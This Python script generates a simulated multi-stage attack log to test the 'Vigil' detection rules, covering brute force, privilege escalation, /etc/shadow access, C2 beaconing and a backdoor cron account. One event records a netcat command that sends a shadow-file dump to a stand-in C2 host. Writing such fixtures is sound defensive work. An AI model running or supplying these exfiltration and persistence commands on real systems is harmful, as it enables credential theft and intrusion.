#!/usr/bin/env python3
"""
Vigil Attack Simulation Log Generator

Generates a realistic multi-stage JSONL attack corpus covering:
  - SSH brute force -> lateral movement (vigil-001, vigil-011)
  - Password spray campaign (vigil-002)
  - Privilege escalation chain (vigil-003, vigil-012)
  - Credential dumping with exfiltration (vigil-006, vigil-013)
  - Suspicious process execution (vigil-007)
  - Web auth brute force (vigil-008)
  - C2 beacon traffic (vigil-009)
  - Account lockouts (vigil-010)
  - Persistence backdoor chain (vigil-004, vigil-005, vigil-015)
  - Recon -> exploitation chain (vigil-014)

Interspersed with benign background traffic for realism.
"""

import json
import random
from datetime import datetime, timezone, timedelta

ATTACKER_IP = "185.220.101.47"
INTERNAL_HOST_A = "10.0.1.20"
INTERNAL_HOST_B = "10.0.1.35"
COMPROMISED_HOST = "web-prod-01"
LATERAL_TARGET = "db-prod-02"
BENIGN_IPS = ["10.0.1.5", "10.0.1.8", "10.0.1.12", "10.0.1.19", "10.0.1.22"]
CDN_IPS = ["104.16.0.1", "172.64.0.1", "1.1.1.1"]
C2_IP = "91.108.4.200"

events = []
BASE_TIME = datetime(2026, 5, 13, 2, 0, 0, tzinfo=timezone.utc)


def ts(offset_seconds):
    return (BASE_TIME + timedelta(seconds=offset_seconds)).isoformat()


def emit(t, event_type, **kwargs):
    event = {"timestamp": ts(t), "event_type": event_type}
    event.update(kwargs)
    events.append(event)


# ─── PHASE 0: Benign background (t=0 to t=120) ───────────────────────────────

for i in range(8):
    emit(i * 12, "auth_success", service="sshd", src_ip=random.choice(BENIGN_IPS),
         dest_host=COMPROMISED_HOST, user="deploy")

for i in range(5):
    emit(i * 20 + 5, "network_conn", direction="outbound", src_ip=INTERNAL_HOST_A,
         dest_ip=random.choice(CDN_IPS), dest_port=443)

emit(30, "cron_modified", host=COMPROMISED_HOST, user="root",
     cron_file="/etc/cron.d/backup", detail="Added nightly backup job")

emit(60, "auth_success", service="sshd", src_ip="10.0.1.5",
     dest_host=COMPROMISED_HOST, user="alice")

emit(90, "sudo_success", user="alice", host=COMPROMISED_HOST,
     command="/usr/bin/systemctl restart nginx")


# ─── PHASE 1: SSH Brute Force (t=200 to t=260) ───────────────────────────────
# vigil-001: 5+ auth_failure from same src_ip in 60s

for i in range(7):
    emit(200 + i * 8, "auth_failure", service="sshd",
         src_ip=ATTACKER_IP, dest_host=COMPROMISED_HOST,
         user=random.choice(["root", "admin", "ubuntu", "ec2-user", "deploy"]))


# ─── PHASE 2: SSH Lateral Movement (t=270) ───────────────────────────────────
# vigil-011: auth_failure -> auth_success from same src_ip

emit(270, "auth_success", service="sshd", src_ip=ATTACKER_IP,
     dest_host=COMPROMISED_HOST, user="deploy")


# ─── PHASE 3: Password Spray (t=300 to t=430) ────────────────────────────────
# vigil-002: 8+ auth_failure across different users from same src_ip in 120s

spray_users = ["alice", "bob", "charlie", "david", "eve",
               "frank", "grace", "henry", "iris", "james"]
for i, user in enumerate(spray_users):
    emit(300 + i * 13, "auth_failure", service="sshd",
         src_ip=ATTACKER_IP, dest_host=COMPROMISED_HOST, user=user)


# ─── PHASE 4: Recon Port Scan -> Auth Attempt (t=450 to t=510) ───────────────
# vigil-014: scan_detected -> auth_failure from same src_ip

emit(450, "network_conn", direction="outbound", src_ip=ATTACKER_IP,
     dest_ip=INTERNAL_HOST_B, dest_port=22, scan_detected="true",
     detail="Nmap SYN scan detected by IDS")

emit(460, "network_conn", direction="outbound", src_ip=ATTACKER_IP,
     dest_ip=INTERNAL_HOST_B, dest_port=3306, scan_detected="true")

emit(475, "network_conn", direction="outbound", src_ip=ATTACKER_IP,
     dest_ip=INTERNAL_HOST_B, dest_port=5432, scan_detected="true")

emit(510, "auth_failure", service="sshd", src_ip=ATTACKER_IP,
     dest_host=LATERAL_TARGET, user="root")


# ─── PHASE 5: Sudo Failure Storm + Escalation (t=540 to t=620) ───────────────
# vigil-003: 3+ sudo_failures from same user in 60s
# vigil-012: sudo_failure -> sudo_success from same user

for i in range(4):
    emit(540 + i * 12, "sudo_failure", user="deploy",
         host=COMPROMISED_HOST, command="sudo su -")

emit(620, "sudo_success", user="deploy", host=COMPROMISED_HOST,
     command="sudo su -", detail="Privilege escalation to root")


# ─── PHASE 6: Credential Dump (t=640 to t=700) ───────────────────────────────
# vigil-006: file_access /etc/shadow
# vigil-013: file_access /etc/shadow -> process_exec on same host

emit(640, "file_access", host=COMPROMISED_HOST, user="root",
     file_path="/etc/shadow", access_type="read",
     process="python3", detail="Direct read of shadow file")

emit(650, "file_access", host=COMPROMISED_HOST, user="root",
     file_path="/etc/passwd", access_type="read",
     process="python3")

# vigil-007: suspicious process (nc for exfiltration)
emit(695, "process_exec", host=COMPROMISED_HOST, user="root",
     process="nc", args=f"-w3 {C2_IP} 4444 < /tmp/.shadow_dump",
     detail="Netcat exfiltration of credential dump")


# ─── PHASE 7: Web Auth Brute Force (t=720 to t=790) ─────────────────────────
# vigil-008: 10+ http_auth_failure from same src_ip in 60s

for i in range(12):
    emit(720 + i * 5, "http_auth_failure", src_ip=ATTACKER_IP,
         dest_host=COMPROMISED_HOST, path="/admin/login",
         user_agent="python-requests/2.31.0", status_code=401)


# ─── PHASE 8: Account Lockouts (t=810 to t=870) ──────────────────────────────
# vigil-010: 3+ account_lockouts in 120s grouped by dest_host

for user in ["alice", "bob", "charlie"]:
    emit(810 + ["alice", "bob", "charlie"].index(user) * 20,
         "account_lockout", dest_host=COMPROMISED_HOST,
         user=user, detail="Account locked after repeated failures")


# ─── PHASE 9: C2 Beacon (t=900 to t=1800) ────────────────────────────────────
# vigil-009: 8+ outbound network_conn to same dest_ip in 900s

for i in range(10):
    emit(900 + i * 85, "network_conn", direction="outbound",
         src_ip=INTERNAL_HOST_A, dest_ip=C2_IP, dest_port=443,
         bytes_out=128, bytes_in=64, detail="Regular beacon interval ~85s")


# ─── PHASE 10: Persistence (t=1850 to t=1960) ────────────────────────────────
# vigil-004: user_created
# vigil-005: cron_modified
# vigil-015: user_created -> cron_modified on same host

emit(1850, "user_created", host=COMPROMISED_HOST, user="root",
     new_user="svcbackup", shell="/bin/bash", home="/var/lib/svcbackup",
     detail="Backdoor account created with home directory")

emit(1870, "cron_modified", host=COMPROMISED_HOST, user="root",
     cron_file="/etc/cron.d/svcbackup",
     detail="Added cron: */5 * * * * svcbackup /var/lib/svcbackup/.update >/dev/null 2>&1")


# ─── PHASE 11: More benign traffic to end (t=1980 to t=2100) ─────────────────

for i in range(6):
    emit(1980 + i * 20, "auth_success", service="sshd",
         src_ip=random.choice(BENIGN_IPS), dest_host=COMPROMISED_HOST,
         user="alice")

emit(2050, "sudo_success", user="alice", host=COMPROMISED_HOST,
     command="/usr/bin/apt-get update")

emit(2080, "network_conn", direction="outbound", src_ip=INTERNAL_HOST_A,
     dest_ip="8.8.8.8", dest_port=53, detail="DNS query")


# ─── Write output ─────────────────────────────────────────────────────────────

output_path = "demo_attack.log"
with open(output_path, "w") as f:
    f.write("# Vigil Demo Attack Simulation Log\n")
    f.write(f"# Generated: {datetime.now(timezone.utc).isoformat()}\n")
    f.write(f"# Events: {len(events)}\n")
    f.write("#\n")
    f.write("# Attack timeline:\n")
    f.write("#   t=0-120    Benign background traffic\n")
    f.write("#   t=200-270  SSH brute force -> lateral movement (vigil-001, vigil-011)\n")
    f.write("#   t=300-430  Password spray campaign (vigil-002)\n")
    f.write("#   t=450-510  Port scan -> auth attempt recon chain (vigil-014)\n")
    f.write("#   t=540-620  Sudo failure storm + privilege escalation (vigil-003, vigil-012)\n")
    f.write("#   t=640-695  Credential dump + exfiltration (vigil-006, vigil-007, vigil-013)\n")
    f.write("#   t=720-790  Web application brute force (vigil-008)\n")
    f.write("#   t=810-870  Account lockout storm (vigil-010)\n")
    f.write("#   t=900-1800 C2 beacon traffic (vigil-009)\n")
    f.write("#   t=1850-1870 Persistence backdoor chain (vigil-004, vigil-005, vigil-015)\n")
    f.write("#   t=1980-2100 Benign background traffic\n")
    f.write("#\n")
    for event in sorted(events, key=lambda e: e["timestamp"]):
        f.write(json.dumps(event) + "\n")

print(f"[+] Generated {len(events)} events -> {output_path}")
print(f"[+] Attack phases cover rules vigil-001 through vigil-015")
print(f"[+] Timeline spans {(len(events) * 1)} events across ~35 minutes of simulated time")
